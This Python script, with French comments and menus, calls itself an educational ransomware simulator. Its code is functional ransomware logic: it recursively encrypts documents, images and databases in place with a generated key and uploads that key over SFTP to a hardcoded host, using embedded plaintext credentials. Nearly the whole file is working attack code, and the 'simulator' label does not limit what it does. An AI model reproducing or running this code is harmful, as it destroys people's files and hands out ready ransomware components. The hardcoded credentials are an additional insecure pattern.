#!/usr/bin/env python3
# SIMULATEUR RANSOMWARE AVEC MENU INTERACTIF
import os
import sys
import time
from pathlib import Path
from cryptography.fernet import Fernet
import paramiko
import logging
import subprocess
from getpass import getpass

# Configuration des couleurs
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'

# Configuration du logging
logging.basicConfig(
    level=logging.INFO,
    format=f'{Colors.BLUE}%(asctime)s{Colors.END} - {Colors.YELLOW}%(levelname)s{Colors.END} - %(message)s',
    handlers=[
        logging.FileHandler('/tmp/ransomware_sim.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger()

class RansomwareSimulator:
    def __init__(self):
        self.key = None
        self.cipher = None
        self.key_filename = f"key_{os.uname().nodename}.key"
        self.key_dir = "/home/doranco/Desktop/script/cle de dechiffrement"
        
        # Configuration SFTP (optionnelle)
        self.sftp_config = {
            'host': '192.168.45.61',
            'port': 22,
            'username': 'doranco',
            'password': 'doranco',
            'remote_dir': '/upload/keys'
        }

        # Extensions cibles
        self.target_exts = {
            '.txt', '.doc', '.docx', '.xls', '.xlsx', 
            '.pdf', '.jpg', '.png', '.sql', '.db'
        }

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def show_banner(self):
        self.clear_screen()
        print(f"""{Colors.RED}
    ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
    ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
    ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
    ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝
    {Colors.END}""")
        print(f"{Colors.CYAN}=== SIMULATEUR ÉDUCATIF - ENVIRONNEMENT DE TEST ==={Colors.END}\n")

    def generate_key(self):
        """Génère une nouvelle clé de chiffrement"""
        logger.info(f"{Colors.GREEN}Génération de la clé...{Colors.END}")
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        logger.info(f"Clé générée: {Colors.YELLOW}{self.key.decode()[:12]}...{Colors.END}")
        return True

    def save_key_locally(self):
        """Sauvegarde la clé localement"""
        try:
            os.makedirs(self.key_dir, exist_ok=True)
            key_path = os.path.join(self.key_dir, self.key_filename)
            
            with open(key_path, 'wb') as f:
                f.write(self.key)
            
            logger.info(f"{Colors.GREEN}Clé sauvegardée dans {Colors.CYAN}{key_path}{Colors.END}")
            return True
        except Exception as e:
            logger.error(f"{Colors.RED}Erreur sauvegarde: {e}{Colors.END}")
            return False

    def send_key_sftp(self):
        """Envoie la clé via SFTP"""
        if not self.key:
            logger.error(f"{Colors.RED}Aucune clé générée!{Colors.END}")
            return False

        try:
            transport = paramiko.Transport((self.sftp_config['host'], self.sftp_config['port']))
            transport.connect(username=self.sftp_config['username'], password=self.sftp_config['password'])
            sftp = paramiko.SFTPClient.from_transport(transport)
            
            # Création dossier distant si inexistant
            try:
                sftp.mkdir(self.sftp_config['remote_dir'])
            except IOError:
                pass
            
            remote_path = f"{self.sftp_config['remote_dir']}/{self.key_filename}"
            
            # Création fichier temporaire
            tmp_path = f"/tmp/{self.key_filename}"
            with open(tmp_path, 'wb') as f:
                f.write(self.key)
            
            sftp.put(tmp_path, remote_path)
            os.remove(tmp_path)
            sftp.close()
            transport.close()
            
            logger.info(f"{Colors.GREEN}Clé envoyée à {Colors.CYAN}{self.sftp_config['host']}:{remote_path}{Colors.END}")
            return True
        except Exception as e:
            logger.error(f"{Colors.RED}Échec SFTP: {e}{Colors.END}")
            return False

    def encrypt_file(self, filepath):
        """Chiffre un fichier"""
        try:
            if os.path.getsize(filepath) > 50 * 1024 * 1024:  # 50MB max
                return False

            with open(filepath, 'rb') as f:
                data = f.read()
            
            encrypted = self.cipher.encrypt(data)
            
            with open(filepath, 'wb') as f:
                f.write(encrypted)
            
            logger.debug(f"Fichier chiffré: {filepath}")
            return True
        except Exception as e:
            logger.error(f"Erreur sur {filepath}: {e}")
            return False

    def encrypt_directory(self, path):
        """Chiffre récursivement un dossier"""
        if not os.path.exists(path):
            logger.error(f"{Colors.RED}Dossier introuvable: {path}{Colors.END}")
            return

        encrypted = errors = 0
        logger.info(f"{Colors.PURPLE}Début chiffrement de {path}{Colors.END}")
        
        for root, _, files in os.walk(path):
            for file in files:
                filepath = Path(root) / file
                
                if filepath.suffix.lower() not in self.target_exts:
                    continue
                
                if self.encrypt_file(filepath):
                    encrypted += 1
                else:
                    errors += 1
        
        logger.info(f"{Colors.GREEN}Terminé! {encrypted} fichiers chiffrés, {errors} erreurs{Colors.END}")

    def automatic_mode(self):
        """Mode automatique complet"""
        self.show_banner()
        print(f"{Colors.YELLOW}=== MODE AUTOMATIQUE ==={Colors.END}")
        
        # 1. Génération clé
        print(f"\n{Colors.CYAN}[1/3] Génération de la clé...{Colors.END}")
        self.generate_key()
        time.sleep(1)
        
        # 2. Sauvegarde locale
        print(f"{Colors.CYAN}[2/3] Sauvegarde de la clé...{Colors.END}")
        self.save_key_locally()
        time.sleep(1)
        
        # 3. Chiffrement
        print(f"{Colors.CYAN}[3/3] Chiffrement des fichiers...{Colors.END}")
        self.encrypt_directory('/chemin/a/chiffrer')  # Modifiez ce chemin
        time.sleep(1)
        
        print(f"\n{Colors.GREEN}Opération terminée avec succès!{Colors.END}")
        input("\nAppuyez sur Entrée pour continuer...")

    def show_menu(self):
        """Affiche le menu principal"""
        while True:
            self.show_banner()
            print(f"{Colors.BOLD}MENU PRINCIPAL:{Colors.END}")
            print(f"{Colors.GREEN}1.{Colors.END} Générer une clé")
            print(f"{Colors.GREEN}2.{Colors.END} Sauvegarder la clé localement")
            print(f"{Colors.GREEN}3.{Colors.END} Envoyer la clé via SFTP")
            print(f"{Colors.GREEN}4.{Colors.END} Chiffrer un dossier spécifique")
            print(f"{Colors.GREEN}5.{Colors.END} Mode automatique (tout faire)")
            print(f"{Colors.RED}0.{Colors.END} Quitter")
            
            choice = input("\nVotre choix: ")
            
            if choice == "1":
                self.generate_key()
            elif choice == "2":
                self.save_key_locally()
            elif choice == "3":
                self.send_key_sftp()
            elif choice == "4":
                path = input("Chemin du dossier à chiffrer: ")
                self.encrypt_directory(path)
            elif choice == "5":
                self.automatic_mode()
            elif choice == "0":
                print(f"{Colors.YELLOW}Au revoir!{Colors.END}")
                sys.exit(0)
            else:
                print(f"{Colors.RED}Choix invalide!{Colors.END}")
            
            input("\nAppuyez sur Entrée pour continuer...")

if __name__ == '__main__':
    try:
        sim = RansomwareSimulator()
        sim.show_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Interruption par l'utilisateur{Colors.END}")
        sys.exit(1)
    except Exception as e:
        logger.critical(f"{Colors.RED}ERREUR FATALE: {e}{Colors.END}")
        sys.exit(1)